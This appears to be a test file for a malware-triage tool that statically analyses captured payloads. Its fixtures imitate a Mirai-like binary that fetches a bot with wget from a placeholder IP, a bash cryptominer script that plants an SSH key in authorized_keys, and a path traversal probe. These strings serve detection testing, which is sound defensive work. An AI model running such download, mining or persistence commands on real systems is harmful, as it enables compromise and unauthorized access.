import struct

from triage.enrich import payload_context
from triage.payloads import analyze_bytes, analyze_file, find_payload


def elf(machine: int, bits: int = 32, endian: str = "little", body: bytes = b"") -> bytes:
    ident = b"\x7fELF" + bytes([1 if bits == 32 else 2, 1 if endian == "little" else 2, 1]) + b"\x00" * 9
    header = ident + struct.pack("<HH" if endian == "little" else ">HH", 2, machine)
    return header + b"\x00" * 64 + body


def test_elf_architectures():
    assert analyze_bytes(elf(40))["arch"] == "arm"
    mips = analyze_bytes(elf(8, endian="big"))
    assert (mips["arch"], mips["endianness"], mips["bits"]) == ("mips", "big", 32)
    assert analyze_bytes(elf(62, bits=64))["arch"] == "x86-64"
    assert analyze_bytes(elf(9999))["arch"] == "machine-9999"


def test_mirai_like_binary_hints_and_embedded_c2():
    body = (b"UPX!\x00/bin/busybox ECCHI\x00/dev/watchdog\x00\x00"
            b"wget http://198.51.100.23/bins/sora.arm7 -O /tmp/s\x00attack_udp_generic\x00")
    info = analyze_bytes(elf(40, body=body))
    assert info["packed_upx"] is True
    assert "mirai-like (busybox/watchdog handling)" in info["family_hints"]
    assert "ddos" in info["family_hints"] and "downloader" in info["family_hints"]
    assert {"type": "c2_ip", "value": "198.51.100.23"} in info["embedded_iocs"]
    assert any("/dev/watchdog" in s for s in info["notable_strings"])


def test_miner_script():
    script = (b"#!/bin/bash\ncd /tmp\n./xmrig -o stratum+tcp://pool.minexmr.example:4444 --donate-level 1\n"
              b"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB x' >> ~/.ssh/authorized_keys\n")
    info = analyze_bytes(script)
    assert info["type"] == "script" and info["interpreter"] == "/bin/bash"
    assert {"cryptominer", "ssh key persistence"} <= set(info["family_hints"])
    assert {"type": "mining_pool", "value": "pool.minexmr.example:4444"} in info["embedded_iocs"]


def test_other_types():
    assert analyze_bytes(b"\x1f\x8b\x08rest")["type"] == "gzip"
    assert analyze_bytes(b"PK\x03\x04rest")["type"] == "zip"
    assert analyze_bytes(b"MZ\x90\x00")["type"] == "pe"
    assert analyze_bytes(b"\x00\x01\x02\xff")["type"] == "unknown"


def test_find_payload_only_accepts_clean_hashes(tmp_path):
    sha = "a" * 64
    (tmp_path / sha).write_bytes(b"#!/bin/sh\n")
    assert find_payload(sha, tmp_path) == tmp_path / sha
    assert find_payload("../../etc/passwd", tmp_path) is None
    assert find_payload("A" * 64, tmp_path) is None
    assert find_payload(sha, None) is None


def test_payload_context_in_enrichment(tmp_path, monkeypatch):
    monkeypatch.delenv("MALWAREBAZAAR_API_KEY", raising=False)
    monkeypatch.delenv("VT_API_KEY", raising=False)
    data = elf(8, endian="big", body=b"/bin/busybox\x00")
    path = tmp_path / "payload"
    path.write_bytes(data)
    sha = analyze_file(path)["sha256"]
    path.rename(tmp_path / sha)
    out = payload_context([{"sha256": sha, "url": "http://198.51.100.1/m"}, {"sha256": "b" * 64}],
                          str(tmp_path), with_intel=False, cache=None)
    assert out[0]["static_analysis"]["arch"] == "mips"
    assert out[1]["static_analysis"].startswith("file not on the sensor")
    # No payload dir and no reputation keys: nothing to add.
    assert payload_context([{"sha256": sha}], None, with_intel=True, cache=None) == []
